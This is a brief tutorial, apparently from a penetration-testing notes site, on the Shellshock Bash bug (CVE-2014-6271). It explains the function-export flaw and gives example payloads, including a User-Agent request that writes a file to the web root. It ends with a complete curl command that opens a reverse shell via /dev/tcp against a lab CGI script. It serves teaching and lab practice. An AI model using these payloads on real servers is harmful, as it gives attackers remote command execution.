---
description: >-
  Known as the “Bash Bug” or “ShellShock,” the GNU Bash Remote Code Execution
  Vulnerability (CVE-2014-6271) could allow an attacker to gain control over a
  targeted computer if exploited successfully.
---

# Shellshock

{% embed url="https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability" %}

Shellshock - [CVE-2014-6271](http://www.cvedetails.com/cve/cve-2014-6271) and [CVE-2014-6278](http://www.cvedetails.com/cve/cve-2014-6278) - was a serious vulnerability found in the Bash command shell, which is commonly used in Linux distributions. The vulnerability allowed attackers to run arbitrary commands on an affected system. The most commonly affected webs server where the ones using the [CGI Environment](http://www.cgi101.com/book/ch3/text.html).

In general - Bash allows the exporting of shell function to other bash instances on the server. It is done by creating an environmental variable with the function definition as such…

```text
env ENV_VAR_FN=’() { <your function> };’
```

The **ENV\_VAR\_FN** is the function that is executed in the bash instance. Unfortunately, there was a bug in the implementation of this to where the function continued to read and execute beyond the function definition - allowing to run additional code. Technically it should have stopped reading past the function definition, marked with a `;`.

```text
env ENV_VAR_FN=’() { <your function> }; <attacker code here>’
```

Many services were affected by this bug. Any web server that consumed user input and added the input to the bash environment, was vulnerable. A possible exploit in the CGI Environment would look like this.

```text
GET /<server path> HTTP/1.1

User-agent: () { :;}; echo something>/var/www/html/new_file
```

This command would create a file called **new\_file**, which an attacker could use to their advantage. So, since we now know that **cgi-bin/status** is exploitable, and we know “how” to exploit it, let go ahead and do so!

We will be leveraging the [cURL](https://curl.haxx.se/docs/manpage.html) command for this vulnerability. This way we can send edited User-Agent header information that will be accepted by the CGI’s Bash environment.

```text
# Nikto give us 
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).

# Shellshock exploit using curl
root@kali:~# curl -x http://192.168.1.9:3128 -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.1.7/1234 0>&1" http://192.168.1.9/cgi-bin/status
```

